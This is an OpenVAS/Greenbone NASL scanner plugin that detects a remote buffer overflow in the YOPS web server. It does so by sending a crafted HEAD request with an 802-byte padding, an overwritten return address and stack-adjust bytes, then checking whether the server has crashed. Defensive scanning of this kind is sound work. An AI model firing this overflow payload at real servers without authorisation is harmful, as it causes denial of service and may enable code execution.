# SPDX-FileCopyrightText: 2010 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100917");
  script_version("2023-07-21T05:05:22+0000");
  script_tag(name:"last_modification", value:"2023-07-21 05:05:22 +0000 (Fri, 21 Jul 2023)");
  script_tag(name:"creation_date", value:"2010-11-26 13:31:06 +0100 (Fri, 26 Nov 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("YOPS (Your Own Personal [WEB] Server) Remote Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/43156");
  script_xref(name:"URL", value:"http://zed.karelia.ru/yops/index.html");
  script_xref(name:"URL", value:"http://sourceforge.net/projects/yops2009");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_category(ACT_DENIAL);
  script_family("Buffer overflow");
  script_copyright("Copyright (C) 2010 Greenbone AG");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 8888);
  script_mandatory_keys("swebs/banner");

  script_tag(name:"summary", value:"YOPS (Your Own Personal [WEB] Server) is prone to a remote buffer-
  overflow vulnerability because it fails to perform adequate
  checks on user-supplied input.");

  script_tag(name:"impact", value:"Successfully exploiting this issue may allow remote attackers to
  execute arbitrary commands in the context of the application. Failed
  attacks will cause denial-of-service conditions.");

  script_tag(name:"affected", value:"YOPS (Your Own Personal [WEB] Server) 2009-11-30 is vulnerable. Other
  versions may also be affected.");

  script_tag(name:"solution", value:"The vendor released a patch. Please see the references for more
  information.");

  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("port_service_func.inc");

port = http_get_port(default:8888);

banner = http_get_remote_headers(port: port);
if(!banner || "Server: swebs" >!< banner)exit(0);

soc = http_open_socket(port);
if(!soc)
  exit(0);

buffer = "HEAD ";
buffer += crap(data:"A", length:802);
buffer += crap(data:raw_string(0x47,0xce,0x04,0x08),length:4*4);
buffer += " HTTP/1.1";

stackadjust = raw_string(0xcb,0xbc,0x69,0x69,0x96,0xb0);

payload = buffer + stackadjust + string("\r\n\r\n");

send(socket:soc, data:payload);
close(soc);

if(http_is_dead(port:port)) {
  security_message(port:port);
  exit(0);
}

exit(99);
